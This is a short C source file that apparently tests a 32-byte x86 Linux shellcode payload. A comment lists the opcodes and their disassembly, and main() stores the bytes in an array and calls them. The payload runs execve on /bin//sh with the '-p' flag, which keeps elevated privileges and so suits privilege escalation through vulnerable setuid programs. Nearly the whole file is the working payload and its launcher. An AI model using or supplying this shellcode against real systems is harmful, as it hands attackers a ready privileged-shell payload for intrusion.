#include <stdlib.h>
#include <stdio.h>

// execve("/bin//sh", ["/bin//sh", "-p"], NULL) - 32 bytes

/*
 *  \x90                    // nop
 *  \x6a\x0b                // push   $0xb
 *  \x58                    // pop    %eax
 *  \x99                    // cltd
 *  \x52                    // push   %edx
 *  \x66\x68\x2d\x70        // pushw  $0x702d
 *  \x89\xe1                // mov    %esp,%ecx
 *  \x52                    // push   %edx
 *  \x68\x2f\x2f\x73\x68    // push   $0x68732f2f
 *  \x68\x2f\x62\x69\x6e    // push   $0x6e69622f
 *  \x89\xe3                // mov    %esp,%ebx
 *  \x52                    // push   %edx
 *  \x51                    // push   %ecx
 *  \x53                    // push   %ebx
 *  \x89\xe1                // mov    %esp,%ecx
 *  \xcd\x80                // int    $0x80
 */

int main(int argc, char ** argv)
{
    const char code[] = "\x90\x6a\x0b\x58\x99\x52\x66\x68"
                        "\x2d\x70\x89\xe1\x52\x68\x2f\x2f"
                        "\x73\x68\x68\x2f\x62\x69\x6e\x89"
                        "\xe3\x52\x51\x53\x89\xe1\xcd\x80";

    int (*func)();
    func = (int (*)()) code;
    (int)(*func)();

    return 0;
}

